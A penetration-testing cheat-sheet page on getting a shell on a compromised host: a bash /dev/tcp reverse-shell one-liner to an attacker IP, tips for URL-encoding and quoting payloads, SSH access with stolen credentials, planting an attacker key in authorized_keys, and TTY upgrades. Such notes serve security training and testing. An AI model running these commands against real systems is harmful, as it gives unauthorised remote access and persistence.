---
sort : 3
---

# Get a Shell

## Reverse Shells    

A reverse shell, also known as a remote shell or “connect-back shell,” takes advantage of the target system's vulnerabilities to initiate a shell session and then access the victim's computer.

Mostly this is done by uploading the reverse shell as a file, or abusing an RCE vulnerability to execute it directly.

[generate a reverse shell](https://www.revshells.com/)

[pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

```note
some times thereverse shell doesn't work, why ?? 

* if it is a bash reverse shell, e.g. bash -i >& /dev/tcp/10.10.x.x/1234 0>&1 , try precede it with `bash -c` 


* try URL encoding / double URL encoding


* quotations conflict, how to deal with it ??
    * embrace the whole payload with double qoutes, then escape the inside ones
    
    * there is also some tools that ask you to pass the payload as an argv, so make sure how they gonna receive it (inside a double or a single qoutes ??)
```


<br><br>



## SSH 

SSH or Secure Shell or Secure Socket Shell,  is a network protocol that gives users a secure way to access a computer over an unsecured network.

### Using Compromised Password OR Reuse Misconfiguration OR Private Key Leakage : 

```bash
$ ssh victim@Host
    password : ******* 

# OR 

$ chmod 600 PrivateKey
$ ssh -i PrivateKey victim@Host
```


### Connecting Via SSH is Better ? (.ssh)

you already having a shell ...  

```bash
# On the victim machine

# if you can write on the user dir (create files/dirs)
$ mkdir ".ssh"; cd .ssh ; touch authorized_keys
```

```bash
# On the attacker machine

$ cd /tmp; ssh-keygen  
    # Generating public/private rsa key pair.
    Enter file in which to save the key (/home/o54ma/.ssh/id_rsa): TmpKey # file name to save the key 
    Enter passphrase (empty for no passphrase):                           # no password 
    Enter same passphrase again:                                          # no password 


$ cat TmpKey.pub | xclip -selection c                                     # copy the public key
```

```bash
# Back to the victim side

$ echo "CTRL+V" >> authorized_keys
```

```bash
# Back to the attacker side

$ ssh -i TmpKey Username@Host
```


```note
why we are doing this ?? 

* better interactive shell experience 

* for SSH Tunneling if you don't have the password of the victim user 
```


<!-- ### BruteForce Attack

not recommended ^^ :star: -->


<br><br>



# Spawning a TTY shell 

```bash
# Python
$ python -c 'import pty; pty.spawn("/bin/sh")'
$ python -c 'import pty; pty.spawn("/bin/bash")'

# Script 
$ script /dev/null -c bash

# sh
$ /bin/sh -i

# bash
$ /bin/bash -i

# Echo
$ echo 'os.system('/bin/bash')'

# Perl
$ perl -e 'exec "/bin/sh";'

# From within VI
:!bash
```

```bash
$ export TERM=xterm-256color
$ export SHELL=BASH

# CTRL-Z
$ stty raw -echo; fg
# Enter twice
```